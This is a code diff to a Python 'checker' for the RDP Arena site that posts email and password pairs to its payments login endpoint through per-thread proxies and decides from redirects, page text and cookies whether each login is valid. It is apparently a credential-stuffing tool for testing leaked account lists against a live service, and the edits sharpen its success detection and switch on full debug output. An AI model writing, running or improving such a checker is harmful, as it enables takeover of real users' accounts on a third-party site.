@@ -1,5 +1,5 @@
 """
-Checker for RDP Arena (www.rdparena.com) – Debug‑ready & improved success detection.
+Checker for RDP Arena – Debug version with better error detection.
 """
 import requests
 import threading
@@ -9,8 +9,8 @@ BASE_URL = "https://www.rdparena.com/"
 LOGIN_URL = BASE_URL + "payments/login"
 TIMEOUT = 15
 
-# Set to True to print debug info (for testing)
-DEBUG = False
+# Set to True to see full response body
+DEBUG = True
 
 def check(email: str, password: str) -> Tuple[bool, str]:
     proxy = getattr(threading.current_thread(), 'proxy', None)
@@ -28,62 +28,63 @@ def check(email: str, password: str) -> Tuple[bool, str]:
     })
 
     try:
-        payload = {"email": email, "password": password}   # Try email first
-        # If that fails, you can add fallback field names.
-
+        payload = {"email": email, "password": password}
         response = session.post(LOGIN_URL, data=payload, timeout=TIMEOUT, allow_redirects=False)
 
         if DEBUG:
             print(f"[DEBUG] Status: {response.status_code}")
             print(f"[DEBUG] Headers: {response.headers}")
             print(f"[DEBUG] Cookies: {session.cookies.get_dict()}")
-            print(f"[DEBUG] Body (first 300): {response.text[:300]}")
+            print(f"[DEBUG] Body (full):")
+            print(response.text)   # Print everything
 
         # ---------- Success detection ----------
 
-        # 1. Redirect – treat as success unless the redirect goes to login page
+        # 1. Redirect – success
         if response.status_code in (301, 302):
             location = response.headers.get("Location", "")
-            # If the redirect goes back to login or contains 'login' – it's a failure
             if "login" in location.lower() or "signin" in location.lower():
                 return False, f"Redirected back to login: {location}"
-            # Otherwise, assume success
             return True, f"Login successful (redirect to {location})"
 
         # 2. HTTP 200 – inspect content
         if response.status_code == 200:
             html = response.text.lower()
-            # Check for explicit error messages
-            error_phrases = ["invalid", "incorrect", "error", "failed", "wrong", "not found", "password", "username"]
-            has_error = any(phrase in html for phrase in error_phrases)
+            title = "title" in html and html.split("<title>")[1].split("</title>")[0] if "<title>" in html else ""
 
-            # Check for success keywords
-            success_phrases = ["dashboard", "logout", "welcome", "account", "my account", "profile"]
-            has_success = any(phrase in html for phrase in success_phrases)
+            # --- Error messages (WHMCS style) ---
+            error_patterns = [
+                "invalid email", "invalid login", "incorrect email", "incorrect login",
+                "authentication failed", "credentials are incorrect", "wrong password",
+                "login failed", "account not found", "inactive account", "your account is suspended"
+            ]
+            has_error = any(pattern in html for pattern in error_patterns)
 
-            # Check for login form (presence of password field)
+            # --- Success indicators ---
+            success_patterns = ["dashboard", "logout", "welcome", "account", "my account", "profile"]
+            has_success = any(pattern in html for pattern in success_patterns)
+
+            # --- Presence of login form ---
             has_login_form = 'name="password"' in html or 'type="password"' in html
 
-            # Decide
+            # --- Decision ---
             if has_success:
                 return True, "Login successful (content marker)"
             if has_error:
                 return False, "Login failed (error message found)"
             if has_login_form and not has_success:
-                # Probably still on login page, but no explicit error
-                return False, "Login failed (login form still present)"
-            # If no clear success, but also no error or form, maybe success (but cautious)
-            # Check for session cookie as a strong indicator
+                # Still on login page, but no explicit error – likely a failure
+                return False, "Login failed (login form still present, no success indicator)"
+            # Check for session cookie as a weak indicator
             if session.cookies.get_dict():
-                return True, "Login successful (session cookie set)"
-            # If we have a cookie named 'PHPSESSID' or similar, treat as success
-            if any(cookie in session.cookies for cookie in ['PHPSESSID', 'user_id', 'session', 'auth']):
-                return True, "Login successful (session cookie present)"
-
-            # Fallback: ambiguous
+                # But we already saw that the cookie is set even before login.
+                # So we should only trust this if we also see a success indicator,
+                # but we already checked that. So we can ignore.
+                pass
+            # If we are still here, ambiguous
             return False, "Login response ambiguous (treated as failure)"
 
-        # 3. Other status codes (403, 500, etc.)
+        # 3. Other status codes
         else:
             return False, f"HTTP {response.status_code}: {response.reason}"
 
